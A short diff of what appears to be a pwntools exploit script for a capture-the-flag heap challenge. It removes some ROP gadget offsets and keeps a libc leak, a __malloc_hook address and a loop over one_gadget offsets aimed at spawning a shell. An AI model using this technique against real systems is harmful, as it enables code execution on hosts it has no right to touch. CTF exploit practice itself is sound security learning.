@@ -58,13 +58,7 @@ def __main__():
 		gdb.attach(p, gdbscript)
 
 	libc_base = leak_libc(p)
-	pop_rcx = libc_base + 0x3eb0b
-	pop_r10 = libc_base + 0x00000000001306b5
-	pop_rsp = libc_base + 0x0000000000003960
-	pop_rbp = libc_base + 0x0000000000021353
-	ret = libc_base + 0x8aa
 	malloc_hook = libc_base + 0x3ebc30
-	free_hook = libc_base + 0x3ed8e8
 	log.info('malloc_hook 0x%x' % malloc_hook)
 	one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
 	for i in one_gadget:
